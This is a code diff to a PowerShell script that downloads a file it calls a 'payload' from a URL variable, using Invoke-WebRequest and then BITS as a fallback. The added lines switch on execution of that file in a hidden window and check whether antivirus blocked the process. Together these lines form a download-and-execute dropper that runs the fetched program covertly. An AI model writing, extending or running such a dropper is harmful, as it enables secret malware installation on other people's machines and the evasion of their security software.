@@ -30,16 +30,28 @@ New-Item $d -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
 
 # Download using native PowerShell (more reliable)
 try {
+    Write-Host "Downloading payload..."
     Invoke-WebRequest -Uri $u -OutFile $p -TimeoutSec 30 -ErrorAction Stop
+    Write-Host "Download completed using Invoke-WebRequest."
 } catch {
-    # Fallback to BITS
+    Write-Host "Invoke-WebRequest failed, trying BITS transfer..."
     Start-BitsTransfer -Source $u -Destination $p -Priority High -ErrorAction SilentlyContinue
 }
 
 # Check if download succeeded
 if (Test-Path $p) {
-    # Optionally run the downloaded file
-    # Start-Process $p
+    Write-Host "File downloaded successfully. Executing..."
+    Start-Sleep -Seconds 2
+    Start-Process -FilePath $p -WindowStyle Hidden
+    Start-Sleep -Seconds 3
+    
+    # Verify if process started
+    $procName = [System.IO.Path]::GetFileNameWithoutExtension($n)
+    if (Get-Process -Name $procName -ErrorAction SilentlyContinue) {
+        Write-Host "Process '$procName' is running."
+    } else {
+        Write-Warning "File exists but process did not start. Possibly blocked by AV."
+    }
 } else {
-    Write-Error "Download failed."
+    Write-Error "Download failed. File not found at: $p"
 }
